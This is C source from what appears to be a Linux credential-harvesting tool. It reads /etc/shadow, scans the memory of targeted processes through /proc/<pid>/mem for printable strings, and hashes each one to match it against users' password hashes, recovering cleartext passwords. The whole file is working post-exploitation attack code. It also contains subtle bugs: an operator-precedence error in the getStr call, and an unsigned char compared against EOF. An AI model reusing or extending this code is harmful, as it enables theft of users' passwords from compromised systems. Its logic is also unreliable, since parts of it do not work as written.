#include <stdlib.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/syscall.h>
#include <ctype.h>
#include <sys/mman.h>

#include "targets.h"
#include "scanner.h"
#include "dbg.h"
#include "max.h"
#include "users.h"

// Global user list
user_t *g_users;
int g_nusers;

// Iterate discovered target processes - proccess memory for each one
int processTargets(Target targets[MAX_TARGETS])
{
    int i = -1, j = -1;
    int ret = -1;

    // Potential passwords are hashed and compared against /etc/shadow
    // So let's parse user's from there first so they are available for later
    if ( (g_nusers = GetUsers(&g_users)) < 0 )
    {
        log_error("Failed to map parse /etc/shadow users");
        printf("[!!] Failed to parse /etc/shadow users\n");
        goto DONE;
    }

    for (i = 0; i < MAX_TARGETS; i++)
    {
        if (targets[i].pids.size > 0) // if pids found for target
        {
            printf("Searching: %s\n", targets[i].source);
            for (j = 0; j < targets[i].pids.size; j ++)
            {
                if ( processMemory(targets[i], targets[i].pids.array[j]) < 0 )
                {
                    log_warn("Failed to process pid %d", targets[i].pids.array[j]);
                }
            }
        }
    }
    ret = 0;
    DONE:
        PutUsers(&g_users, g_nusers);
        return ret;
}

// Find valid memory regions for given target and pid - process region for each one
int processMemory(Target target, pid_t pid)
{
    FILE *maps_fp = NULL, *mem_fp = NULL;
    char maps_path[MAX_PATH] = {0};
    char mem_path[MAX_PATH] = {0};
    char atts[ATTS_SZ] = {0};
    unsigned long start = 0, end = 0;
    char line[MAX_MAP_LINE] = {0};
    size_t line_len = 0;
    int ret = -1;

    // Open our memory files
    snprintf(maps_path, MAX_PATH-1, "/proc/%d/maps", pid);
    if ( (maps_fp = fopen(maps_path, "r")) == NULL )
    {
        log_error("Failed to open %s", maps_path);
        goto DONE;
    }

    snprintf(mem_path, MAX_PATH-1, "/proc/%d/mem", pid);
    if ( (mem_fp = fopen(mem_path, "r")) == NULL )
    {
        log_error("Failed to open %s", mem_path);
        goto DONE;
    }

    //process memory chunks
    while (fgets(line, MAX_MAP_LINE-1, maps_fp))
    {
        line_len = strlen(line); // get real len
        if ( line[line_len-1] != '\n' )
            log_warn("We did not grab the entire maps line! len: %ld", line_len);

        // Only parse anonymous regions (ie not file backed)
        if ( line[line_len-2] != ' ' )
            continue; //skipping filebacked region
        
        sscanf(line, "%lx-%lx %s", &start, &end, atts);
        if (strstr(atts, "rw") == NULL) // Only parse read/write regions
            continue;
        if ( processRegion(mem_fp, start, end) < 0 )
        {
            log_error("Failed to process region");
            continue;
        }
    }

    ret = 0;
    DONE:
        if (maps_fp != NULL)
            fclose(maps_fp);
        if (mem_fp != NULL)
            fclose(mem_fp);
        return ret;
 
}

// returns string len or -1 on error, -2 no strings found
int getStr(FILE *fp, char *str, size_t min_str, size_t max_str, size_t *cur, size_t max_cur)
{
    unsigned char c = 0;
    int str_len = 0;

    // dont go pass end of region
    while ( *cur < max_cur )
    {
        c = (unsigned char)fgetc(fp);
        if ( c == EOF )
        {
            log_warn("Got EOF while parsing region for strings?");
            return -1;
        }
        (*cur)++; // inc our cursor - the read was good

        // if not printable, check our current run and bail or restart
        if ( !isprint((int)c) )
        {
            if ( str_len >= min_str )
                return str_len; // We have a string!
            // else reset our string if need to and restart
            if ( str_len )
                memset(str, 0, str_len);
            str_len = 0;
            continue;
        }
        // else char IS printable, copy it into our current str and inc our run count
        str[str_len] = c;
        str_len++; 
        if ( str_len == max_str ) //we filled our tring up
            return str_len;
        
    }
    return -2; // hit the end of our range
}


int processRegion(FILE *fp, unsigned long start, unsigned long end)
{
    char str[MAX_STR] = {0};
    int ret = -1;
    size_t cur = 0;
    size_t max_cur = 0;
    int str_len = -1;

    max_cur = (end-start);
    // Seek to our region
    if ( fseeko(fp, start, SEEK_SET) < 0 )
    {
        log_error("Failed to fseeko %lx", start);
        goto DONE;
    }

    while( cur < max_cur )
    {
        if ( (str_len = getStr(fp, str, (MIN_STR), (MAX_STR-1), &cur, max_cur) == -1) )
        {
            log_error("error in getStr!");
            goto DONE;
        }
        if ( str_len == -2 ) //hit max_cur! - no strings found
            break;

        // TODO implement target needles to limit the number
        // of crypt() calls

        // Compare string hash against user hashes for a match
        if ( CheckForUserHash(g_users, g_nusers, str) == 1 )
        {
            // PASS FOUND XXX
        }

        memset(str, 0, str_len);
    }

    ret = 0;
    DONE:
        return ret;
}

